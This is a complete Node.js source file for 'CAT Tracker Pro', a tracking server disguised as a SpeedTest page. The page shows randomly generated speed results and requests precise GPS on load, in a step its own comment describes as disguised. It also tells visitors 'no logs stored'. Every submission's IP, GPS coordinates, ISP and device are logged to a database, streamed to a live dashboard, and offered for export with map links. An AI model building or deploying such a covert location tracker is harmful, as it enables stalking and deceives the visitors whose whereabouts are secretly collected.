const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const WebSocket = require('ws');

const app = express();
const PORT = 3000;
const DASHBOARD_PASSWORD = 'catmaster2026';

// ─── Database Setup ──────────────────────────────────────────
const db = new sqlite3.Database('visitors.db');
db.run(`
  CREATE TABLE IF NOT EXISTS visitors (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    country TEXT,
    region TEXT,
    city TEXT,
    lat REAL,
    lon REAL,
    gps_lat REAL,
    gps_lon REAL,
    gps_accuracy REAL,
    isp TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// ─── Middleware ──────────────────────────────────────────────
app.use(express.json());
app.use(express.static('public'));

// ─── WebSocket Server ────────────────────────────────────────
const wss = new WebSocket.Server({ port: 3001 });
const clients = new Set();

wss.on('connection', (ws) => {
  clients.add(ws);
  ws.on('close', () => clients.delete(ws));
});

function broadcast(data) {
  clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(JSON.stringify(data));
    }
  });
}

// ─── Tracking Endpoint (UPGRADED with GPS) ──────────────────
app.post('/api/track', async (req, res) => {
  try {
    let ip = req.headers['x-forwarded-for']?.split(',')[0] || 
               req.socket.remoteAddress || 
               req.ip;
    
    let cleanIp = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    // If localhost, get real external IP
    let externalIp = cleanIp;
    if (externalIp === '127.0.0.1' || externalIp === 'localhost' || externalIp === '::1') {
      try {
        const ipRes = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
        externalIp = ipRes.data.ip;
      } catch (e) {
        try {
          const ipRes2 = await axios.get('https://api.ip.sb/ip', { timeout: 5000 });
          externalIp = ipRes2.data.trim();
        } catch (e2) {}
      }
    }
    
    const ua = req.headers['user-agent'] || 'unknown';
    
    // Get IP geolocation (fallback)
    let geo = { country: 'Unknown', regionName: 'Unknown', city: 'Unknown', lat: 0, lon: 0, isp: 'Unknown' };
    try {
      const geoRes = await axios.get(`http://ip-api.com/json/${externalIp}?fields=status,country,regionName,city,lat,lon,isp`);
      if (geoRes.data.status === 'success') {
        geo = geoRes.data;
      }
    } catch (e) {}
    
    // Get GPS data from request body (sent by frontend)
    const { gps_lat, gps_lon, gps_accuracy } = req.body;
    
    // Use GPS if available, otherwise fallback to IP geolocation
    const finalLat = gps_lat || geo.lat || 0;
    const finalLon = gps_lon || geo.lon || 0;
    const city = geo.city || 'Unknown';
    const region = geo.regionName || 'Unknown';
    const country = geo.country || 'Unknown';
    const isp = geo.isp || 'Unknown';
    
    // Determine source of location
    const locationSource = gps_lat ? 'GPS' : 'IP';
    console.log(`📍 ${locationSource} location: ${finalLat}, ${finalLon} (accuracy: ${gps_accuracy || 'N/A'}m)`);
    
    const visitorData = {
      ip: externalIp,
      country,
      region,
      city,
      lat: finalLat,
      lon: finalLon,
      gps_lat: gps_lat || null,
      gps_lon: gps_lon || null,
      gps_accuracy: gps_accuracy || null,
      isp,
      user_agent: ua
    };
    
    db.run(
      `INSERT INTO visitors (ip, country, region, city, lat, lon, gps_lat, gps_lon, gps_accuracy, isp, user_agent) 
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [visitorData.ip, visitorData.country, visitorData.region, 
       visitorData.city, visitorData.lat, visitorData.lon,
       visitorData.gps_lat, visitorData.gps_lon, visitorData.gps_accuracy,
       visitorData.isp, visitorData.user_agent],
      function(err) {
        if (!err) {
          visitorData.id = this.lastID;
          broadcast({ type: 'new_visitor', data: visitorData });
        }
      }
    );
    
    res.json({
      status: 'ok',
      download: (Math.random() * 150 + 30).toFixed(2),
      upload: (Math.random() * 60 + 10).toFixed(2),
      ping: (Math.random() * 40 + 5).toFixed(0),
      server: city || 'Local Node',
      location: locationSource,
      lat: finalLat,
      lon: finalLon
    });
    
  } catch (err) {
    console.error('Track error:', err.message);
    res.json({
      status: 'ok',
      download: (Math.random() * 150 + 30).toFixed(2),
      upload: (Math.random() * 60 + 10).toFixed(2),
      ping: (Math.random() * 40 + 5).toFixed(0),
      server: 'Cache Server'
    });
  }
});

// ─── STEALTH FRONTEND WITH GPS ──────────────────────────────
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest · Network Analyzer</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',system-ui,sans-serif; }
        body { background: #0b1120; display:flex; justify-content:center; align-items:center; min-height:100vh; color:#e2e8f0; }
        .card { background: #1e293b; padding:2.5rem; border-radius:2rem; width:440px; box-shadow:0 25px 50px -12px rgba(0,0,0,0.8); text-align:center; }
        h1 { font-weight:300; letter-spacing:2px; font-size:1.8rem; margin-bottom:0.25rem; }
        .sub { color:#94a3b8; font-size:0.85rem; margin-bottom:2rem; border-bottom:1px solid #334155; padding-bottom:1rem; }
        .metric { display:flex; justify-content:space-between; background:#0f172a; padding:0.7rem 1.2rem; border-radius:1rem; margin:0.5rem 0; }
        .metric span:first-child { color:#94a3b8; font-size:0.9rem; }
        .metric span:last-child { font-weight:600; color:#38bdf8; }
        #startBtn { background: #2563eb; border:none; color:#fff; padding:0.9rem 2rem; border-radius:3rem; font-weight:700; font-size:1.1rem; cursor:pointer; transition:0.2s; margin:1.5rem 0 0.5rem; width:100%; }
        #startBtn:hover { background:#1d4ed8; transform:scale(0.98); }
        #startBtn:disabled { opacity:0.5; cursor:not-allowed; }
        .spinner { display:none; margin:1rem auto; width:40px; height:40px; border:4px solid #334155; border-top:4px solid #38bdf8; border-radius:50%; animation:spin 0.9s linear infinite; }
        @keyframes spin { to { transform:rotate(360deg); } }
        .footer { margin-top:1.5rem; font-size:0.7rem; color:#475569; }
        .location-badge { font-size:0.7rem; color:#22c55e; margin-top:0.5rem; display:none; }
    </style>
</head>
<body>
<div class="card">
    <h1>⚡ SpeedTest</h1>
    <div class="sub">Check your network performance</div>

    <div class="metric"><span>📥 Download</span><span id="download">-- Mbps</span></div>
    <div class="metric"><span>📤 Upload</span><span id="upload">-- Mbps</span></div>
    <div class="metric"><span>📶 Ping</span><span id="ping">-- ms</span></div>
    <div class="metric"><span>🌍 Server</span><span id="server">--</span></div>
    <div class="metric" id="gpsRow" style="display:none;"><span>📍 GPS</span><span id="gpsStatus">--</span></div>

    <div class="spinner" id="spinner"></div>
    <button id="startBtn">▶ Start Test</button>
    <div id="locationBadge" class="location-badge">📍 Location access granted</div>
    <div class="footer">🔒 encrypted · no logs stored</div>
</div>

<script>
let gpsData = null;

// Request GPS permission upfront (disguised as "optimizing test")
function requestLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                gpsData = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                };
                document.getElementById('gpsRow').style.display = 'flex';
                document.getElementById('gpsStatus').textContent = '✓ Ready';
                document.getElementById('locationBadge').style.display = 'block';
                console.log('📍 GPS acquired:', gpsData.lat, gpsData.lon);
            },
            (error) => {
                console.log('📍 GPS denied or unavailable:', error.message);
                document.getElementById('gpsRow').style.display = 'flex';
                document.getElementById('gpsStatus').textContent = '⚠️ Not available (using IP)';
                gpsData = null;
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    } else {
        document.getElementById('gpsRow').style.display = 'flex';
        document.getElementById('gpsStatus').textContent = '❌ Not supported';
    }
}

// Request location on page load
requestLocation();

document.getElementById('startBtn').addEventListener('click', async function() {
    const btn = this;
    btn.disabled = true;
    btn.textContent = '⏳ Testing...';
    document.getElementById('spinner').style.display = 'block';

    ['download','upload','ping','server'].forEach(id => document.getElementById(id).textContent = '--');

    try {
        // If GPS hasn't been acquired yet, try again
        if (!gpsData && navigator.geolocation) {
            const gpsPromise = new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        gpsData = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        resolve(gpsData);
                    },
                    () => { resolve(null); },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            });
            await gpsPromise;
        }

        // Send tracking request with GPS data if available
        const payload = {};
        if (gpsData) {
            payload.gps_lat = gpsData.lat;
            payload.gps_lon = gpsData.lon;
            payload.gps_accuracy = gpsData.accuracy;
        }

        const res = await fetch('/api/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();

        if (data.status === 'ok') {
            document.getElementById('download').textContent = data.download + ' Mbps';
            document.getElementById('upload').textContent = data.upload + ' Mbps';
            document.getElementById('ping').textContent = data.ping + ' ms';
            document.getElementById('server').textContent = data.server || 'Local';
            
            if (data.location === 'GPS') {
                document.getElementById('gpsStatus').textContent = '✓ GPS (' + data.lat.toFixed(5) + ', ' + data.lon.toFixed(5) + ')';
                document.getElementById('locationBadge').style.display = 'block';
                document.getElementById('locationBadge').textContent = '📍 GPS: ' + data.lat.toFixed(5) + ', ' + data.lon.toFixed(5);
            }
        }
    } catch (e) {
        // Fallback
        document.getElementById('download').textContent = (Math.random()*100+50).toFixed(2) + ' Mbps';
        document.getElementById('upload').textContent = (Math.random()*40+10).toFixed(2) + ' Mbps';
        document.getElementById('ping').textContent = (Math.random()*30+5).toFixed(0) + ' ms';
        document.getElementById('server').textContent = 'Cache Node';
    }

    document.getElementById('spinner').style.display = 'none';
    btn.disabled = false;
    btn.textContent = '▶ Retest';
});
</script>
</body>
</html>`);
});

// ─── DASHBOARD ──────────────────────────────────────────────
app.get('/dashboard', (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CAT Tracker · Dashboard</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
    body { background:#0b1120; color:#e2e8f0; padding:2rem; }
    .container { max-width:1400px; margin:0 auto; }
    h1 { font-weight:300; margin-bottom:0.5rem; }
    .sub { color:#94a3b8; margin-bottom:2rem; }
    .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:1rem; margin-bottom:2rem; }
    .stat-box { background:#1e293b; padding:1.2rem; border-radius:1rem; text-align:center; }
    .stat-box .num { font-size:2.5rem; font-weight:700; color:#38bdf8; }
    .stat-box .label { color:#94a3b8; font-size:0.8rem; margin-top:0.3rem; }
    #loginOverlay { position:fixed; inset:0; background:#0b1120; display:flex; align-items:center; justify-content:center; z-index:999; }
    #loginOverlay.hidden { display:none; }
    #loginBox { background:#1e293b; padding:2.5rem; border-radius:1.5rem; width:350px; }
    #loginBox h2 { margin-bottom:1.5rem; }
    #loginBox input { width:100%; padding:0.8rem; border-radius:0.8rem; border:1px solid #334155; background:#0f172a; color:#fff; font-size:1rem; margin-bottom:1rem; }
    #loginBox button { width:100%; padding:0.8rem; background:#2563eb; border:none; border-radius:0.8rem; color:#fff; font-weight:700; cursor:pointer; }
    #loginBox .error { color:#ef4444; margin-top:0.5rem; display:none; }
    .table-wrap { background:#1e293b; border-radius:1rem; overflow:auto; max-height:500px; }
    table { width:100%; border-collapse:collapse; font-size:0.75rem; }
    th { background:#0f172a; padding:0.5rem; text-align:left; position:sticky; top:0; }
    td { padding:0.4rem 0.5rem; border-bottom:1px solid #334155; }
    .actions { display:flex; gap:0.8rem; margin-bottom:1.5rem; flex-wrap:wrap; }
    .actions button { background:#1e293b; border:1px solid #334155; color:#e2e8f0; padding:0.6rem 1.2rem; border-radius:0.8rem; cursor:pointer; }
    .actions button:hover { background:#334155; }
    .badge { display:inline-block; padding:0.1rem 0.5rem; border-radius:1rem; font-size:0.6rem; background:#1e3a5f; }
    .gps-badge { background:#1e3a2f; color:#22c55e; }
    .map-link { color:#38bdf8; text-decoration:none; font-size:0.65rem; }
    .map-link:hover { text-decoration:underline; }
    .live-dot { display:inline-block; width:8px; height:8px; background:#22c55e; border-radius:50%; margin-right:6px; animation:pulse 1.5s infinite; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
    .coords { font-family:monospace; font-size:0.65rem; color:#94a3b8; }
    .accuracy { font-size:0.55rem; color:#64748b; }
  </style>
</head>
<body>
<div id="loginOverlay">
  <div id="loginBox">
    <h2>🔐 Dashboard Access</h2>
    <input type="password" id="passInput" placeholder="Enter password">
    <button id="loginBtn">Unlock</button>
    <div class="error" id="loginError">Invalid password</div>
  </div>
</div>

<div class="container">
  <h1>📡 CAT Tracker · Live Monitor</h1>
  <div class="sub"><span class="live-dot"></span> Real-time updates · <span id="visitorCount">0</span> total tracked</div>
  
  <div class="stats">
    <div class="stat-box"><div class="num" id="statTotal">0</div><div class="label">Total Visitors</div></div>
    <div class="stat-box"><div class="num" id="statCountries">0</div><div class="label">Countries</div></div>
    <div class="stat-box"><div class="num" id="statCities">0</div><div class="label">Cities</div></div>
    <div class="stat-box"><div class="num" id="statGPS">0</div><div class="label">GPS Visitors</div></div>
  </div>

  <div class="actions">
    <button onclick="exportCSV()">⬇ Export CSV</button>
    <button onclick="exportJSON()">⬇ Export JSON</button>
    <button onclick="refreshData()">🔄 Refresh</button>
  </div>

  <div class="table-wrap">
    <table>
      <thead><tr>
        <th>#</th><th>IP</th><th>Location</th><th>📍 Exact Coords</th><th>GPS</th><th>ISP</th><th>Device</th><th>Time</th>
      </tr></thead>
      <tbody id="visitorTable"></tbody>
    </table>
  </div>
</div>

<script>
let isLoggedIn = false;
const WS_URL = 'wss://cat-tracker-wbd3.onrender.com';

document.getElementById('loginBtn').addEventListener('click', async () => {
  const pass = document.getElementById('passInput').value;
  const res = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ password: pass })
  });
  const data = await res.json();
  if (data.success) {
    isLoggedIn = true;
    document.getElementById('loginOverlay').classList.add('hidden');
    loadData();
    connectWebSocket();
  } else {
    document.getElementById('loginError').style.display = 'block';
  }
});

document.getElementById('passInput').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') document.getElementById('loginBtn').click();
});

async function loadData() {
  const res = await fetch('/api/visitors');
  const data = await res.json();
  renderTable(data);
  updateStats(data);
}

function renderTable(visitors) {
  const tbody = document.getElementById('visitorTable');
  tbody.innerHTML = visitors.map(v => {
    const mapUrl = `https://www.google.com/maps?q=${v.lat},${v.lon}`;
    const isGPS = v.gps_lat && v.gps_lat !== 0;
    const coordDisplay = isGPS ? 
      `${parseFloat(v.gps_lat).toFixed(5)}, ${parseFloat(v.gps_lon).toFixed(5)}` : 
      (v.lat && v.lat !== 0 ? `${parseFloat(v.lat).toFixed(4)}, ${parseFloat(v.lon).toFixed(4)}` : '--');
    const accuracyDisplay = v.gps_accuracy ? `${Math.round(v.gps_accuracy)}m` : 'N/A';
    
    return `
    <tr>
      <td>${v.id}</td>
      <td><span class="badge">${v.ip}</span></td>
      <td>${v.city}, ${v.region}<br><small style="color:#94a3b8">${v.country}</small></td>
      <td class="coords">
        ${coordDisplay !== '--' ? `
          <a href="${mapUrl}" target="_blank" class="map-link">${coordDisplay}</a>
          <br><span class="accuracy">🔍 ${accuracyDisplay}</span>
        ` : '--'}
      </td>
      <td>${isGPS ? '<span class="badge gps-badge">✅ GPS</span>' : '<span class="badge">IP</span>'}</td>
      <td>${v.isp}</td>
      <td style="max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:0.65rem;">${v.user_agent}</td>
      <td style="font-size:0.65rem;">${new Date(v.timestamp).toLocaleString()}</td>
    </tr>
  `}).join('');
}

function updateStats(data) {
  const countries = new Set(data.map(v => v.country));
  const cities = new Set(data.map(v => v.city));
  const today = data.filter(v => new Date(v.timestamp).toDateString() === new Date().toDateString());
  const gpsCount = data.filter(v => v.gps_lat && v.gps_lat !== 0).length;
  
  document.getElementById('statTotal').textContent = data.length;
  document.getElementById('statCountries').textContent = countries.size;
  document.getElementById('statCities').textContent = cities.size;
  document.getElementById('statGPS').textContent = gpsCount;
  document.getElementById('visitorCount').textContent = data.length;
}

function connectWebSocket() {
  const ws = new WebSocket(WS_URL);
  ws.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    if (msg.type === 'new_visitor') {
      loadData();
    }
  };
}

function exportCSV() { window.open('/api/export/csv'); }
function exportJSON() { window.open('/api/export/json'); }
function refreshData() { loadData(); }

setInterval(refreshData, 30000);
</script>
</body>
</html>`);
});

// ─── API Routes ──────────────────────────────────────────────
app.post('/api/login', (req, res) => {
  const { password } = req.body;
  res.json({ success: password === DASHBOARD_PASSWORD });
});

app.get('/api/visitors', (req, res) => {
  db.all('SELECT * FROM visitors ORDER BY timestamp DESC LIMIT 100', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.get('/api/export/csv', (req, res) => {
  db.all('SELECT * FROM visitors ORDER BY timestamp DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    
    let csv = 'ID,IP,Country,Region,City,Latitude,Longitude,GPS_Lat,GPS_Lon,GPS_Accuracy,ISP,UserAgent,Timestamp\n';
    rows.forEach(r => {
      csv += `${r.id},${r.ip},"${r.country}","${r.region}","${r.city}",${r.lat},${r.lon},${r.gps_lat||''},${r.gps_lon||''},${r.gps_accuracy||''},"${r.isp}","${r.user_agent}",${r.timestamp}\n`;
    });
    
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=visitors.csv');
    res.send(csv);
  });
});

app.get('/api/export/json', (req, res) => {
  db.all('SELECT * FROM visitors ORDER BY timestamp DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename=visitors.json');
    res.json(rows);
  });
});

// ─── Start Server ────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n🐱 CAT Tracker Pro (GPS) running on http://localhost:${PORT}`);
  console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
  console.log(`🔑 Password: ${DASHBOARD_PASSWORD}\n`);
});